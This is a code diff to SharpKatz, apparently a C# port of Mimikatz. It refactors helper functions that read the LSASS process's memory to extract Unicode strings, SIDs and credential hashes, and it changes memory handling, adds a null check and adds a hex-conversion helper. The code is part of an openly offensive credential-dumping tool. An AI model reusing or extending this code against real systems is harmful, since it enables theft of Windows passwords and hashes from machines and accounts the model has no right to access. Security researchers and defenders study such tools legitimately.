@@ -108,8 +108,7 @@ namespace SharpKatz
 
         public static IntPtr GetListAdress(IntPtr hLsass, IntPtr msvMem, string modulename, long max_search_size, int listOffset, byte[] sign)
         {
-            long listSignOffset, listMemOffset;
-            IntPtr listAddr;
+            long listSignOffset;
 
             listSignOffset = (long)OffsetFromSign(modulename, sign, max_search_size);
             if (listSignOffset == 0)
@@ -143,12 +142,12 @@ namespace SharpKatz
             return mystruct;
         }
 
-        public unsafe static int FieldOffset<T>(string fieldName)
+        public static int FieldOffset<T>(string fieldName)
         {
             return Marshal.OffsetOf(typeof(T), fieldName).ToInt32();
         }
 
-        public static unsafe byte[] ExtractSid(IntPtr hLsass, IntPtr pSid)
+        public static byte[] ExtractSid(IntPtr hLsass, IntPtr pSid)
         {
             byte nbAuth;
             int sizeSid;
@@ -173,17 +172,17 @@ namespace SharpKatz
             return str;
         }
 
-        public static unsafe Natives.UNICODE_STRING ExtractUnicodeString(IntPtr hLsass, IntPtr addr)
+        public static Natives.UNICODE_STRING ExtractUnicodeString(IntPtr hLsass, IntPtr addr)
         {
             Natives.UNICODE_STRING str;
             
-            byte[] strBytes = Utility.ReadFromLsass(ref hLsass, addr, Convert.ToUInt64(sizeof(Natives.UNICODE_STRING)));
+            byte[] strBytes = Utility.ReadFromLsass(ref hLsass, addr, Convert.ToUInt64(Marshal.SizeOf(typeof(Natives.UNICODE_STRING))));
             str = ReadStruct<Natives.UNICODE_STRING>(strBytes);
 
             return str;
         }
 
-        public static unsafe string ExtractUnicodeStringString(IntPtr hLsass, Natives.UNICODE_STRING str)
+        public static string ExtractUnicodeStringString(IntPtr hLsass, Natives.UNICODE_STRING str)
         {
             if (str.MaximumLength == 0)
             {
@@ -203,7 +202,7 @@ namespace SharpKatz
             }
         }
 
-        public static unsafe string ExtractANSIStringString(IntPtr hLsass, Natives.UNICODE_STRING str)
+        public static string ExtractANSIStringString(IntPtr hLsass, Natives.UNICODE_STRING str)
         {
             if (str.MaximumLength == 0)
             {
@@ -212,10 +211,15 @@ namespace SharpKatz
 
             // Read the buffer contents for the LSA_UNICODE_STRING from lsass memory
             byte[] resultBytes = ReadFromLsass(ref hLsass, str.Buffer, (ulong)str.MaximumLength);
-            IntPtr tmp_p = Marshal.AllocHGlobal(resultBytes.Length);
-            Marshal.Copy(resultBytes, 0, tmp_p, resultBytes.Length);
 
-            return Marshal.PtrToStringAnsi(tmp_p);
+            GCHandle pinnedArray = GCHandle.Alloc(resultBytes, GCHandleType.Pinned);
+            IntPtr tmp_p = pinnedArray.AddrOfPinnedObject();
+
+            string result = Marshal.PtrToStringAnsi(tmp_p);
+
+            pinnedArray.Free();
+
+            return result;
         }
 
         public static string PrintHexBytes(byte[] byteArray)
@@ -239,9 +243,12 @@ namespace SharpKatz
         public static string PrintHashBytes(byte[] byteArray)
         {
             StringBuilder res = new StringBuilder();
-            for (int i = 0; i < byteArray.Length; i++)
+            if(byteArray != null)
             {
-                res.AppendFormat("{0:x2}", byteArray[i]);
+                for (int i = 0; i < byteArray.Length; i++)
+                {
+                    res.AppendFormat("{0:x2}", byteArray[i]);
+                }
             }
             return res.ToString();
         }
@@ -251,6 +258,16 @@ namespace SharpKatz
             byte[] resBytes = new byte[lenght];
             Array.Copy(source, startindex, resBytes, 0, resBytes.Length);
             return resBytes;
+        }
+
+
+        public static byte[] StringToByteArray(string hex)
+        {
+            int NumberChars = hex.Length;
+            byte[] bytes = new byte[NumberChars / 2];
+            for (int i = 0; i < NumberChars; i += 2)
+                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
+            return bytes;
         }
 
         private static DateTime ToDateTime(FILETIME time)
